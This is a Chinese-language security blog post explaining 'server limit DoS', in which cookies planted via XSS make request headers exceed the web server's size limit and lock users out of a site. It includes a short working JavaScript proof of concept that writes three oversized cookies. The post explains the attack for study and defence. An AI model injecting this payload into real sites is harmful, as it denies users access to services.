---
layout: post
category: ddos
tags: ddos javascript
title1: server limit dos
keywords: server limit dos
description: 在对http发起请求时，会把该域下的cookie当做header发送。由于header的长度是有限制的。当网站存在XSS时，被恶意写入大量的cookie，当cookie的长度大于了header的长度时将会发生server limit dos。
---

### server limit dos

这个问题实际上是由于 webserver 的 request field limit 造成的。当 http request header 过长时，webserver 会产生一个400 或者 4xx 错误

	Your browser sent a request that this server could not understand.
	Size of a request header field exceeds server limit.

**如果这些超长数据保存在cookie中，或者能够让用户每次访问的http 头都超长，就会导致用户一直都无法访问该域名，也就是dos了。**

每个 webserver 之间都有点差异， apache 可能是 8192 字节，具体可以参考这里：

[http://apache.active-venture.com/mod/core6.htm](http://apache.active-venture.com/mod/core6.htm)

测试了一下，发现在IE 8 中可以增加50个 cookie，由于每个cookie的限制是 4k （key, value 对），所以IE8 支持的cookie大小为 204k。 这也是IE 8新增的，以前没这么大。不过这些都远远超过了一般的webserver的默认 server limit 值

    apache 对 http request body 的limite 默认是 2G.

**值得注意的是，使用XSS，将可以写cookie，从而导致这种 server limit dos 攻击。**

### POC

	<script>
	var metastr = 'aaaaaaaaaa';
	var str = '';
	while(str.length <4000){
		str+=metastr;
	}
	document.cookie="val1="+str;
	document.cookie="val2="+str;
	document.cookie="val3="+str;
	</script>

运行这个脚本后，会在当前域下植入3个cookie，总长度超过8192字节， 之后再请求该域就会无法访问了。

因为是 stored cookie, 所以会导致该用户在清理cookie前一直都无法访问该网站。

**对于互联网网站来说，用户才是最重要和最宝贵的资源，哪怕用户的帐户被盗了，对于互联网公司的的损失可能都及不上用户无法访问网站造成的损失大。**

**而使用 XSS WORM 或者是 威力比较大的 XSS， 可以轻易的造成数千、数万的用户无法访问网站！**

[http://sirdarckcat.blogspot.com/2009/04/how-to-use-google-analytics-to-dos.html](http://sirdarckcat.blogspot.com/2009/04/how-to-use-google-analytics-to-dos.html)